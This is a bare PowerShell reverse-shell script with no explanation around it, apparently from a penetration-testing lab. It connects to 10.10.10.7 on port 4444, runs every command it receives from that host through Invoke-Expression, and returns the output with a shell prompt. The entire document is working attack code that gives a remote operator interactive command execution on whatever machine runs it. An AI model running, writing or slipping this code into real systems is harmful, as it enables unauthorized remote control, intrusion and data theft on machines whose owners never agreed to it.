$host_ip="10.10.10.7";
$host_port=4444;
$client = New-Object System.Net.Sockets.TCPClient($host_ip,$host_port);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    if($data.Trim() -eq "exit"){
        break;
    }    
    try{
        $sendback = (iex ".{$data}" 2>&1 | Out-String);
    }
    catch {
        $sendback = $_.Exception.Message+"`n";
    }
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}